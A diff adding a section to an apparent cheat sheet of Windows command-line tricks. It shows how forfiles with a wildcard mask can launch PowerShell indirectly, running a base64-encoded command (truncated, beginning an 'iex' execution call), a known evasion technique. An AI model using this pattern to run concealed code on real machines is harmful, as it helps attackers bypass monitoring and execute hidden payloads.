@@ -24,3 +24,11 @@ Change colors::
     # Write dark or light green on black
     color 2
     color a
+
+Run PowerShell using ``forfiles`` (cf. https://twitter.com/AmnaKMahmood/status/1121504040083496961)::
+
+    # /p to specify the path where to start searching,
+    # /s to recurse into subdirectories,
+    # /m to specify the search mask,
+    # /c to run a command, with @file being the name of the file and @path the full path
+    forfiles /s /p C:\WINDOWS\System32 /m p*ll.*e /c "cmd /c @file -ec aQBlAHgAIAAoAGcAcAAgACcA..."
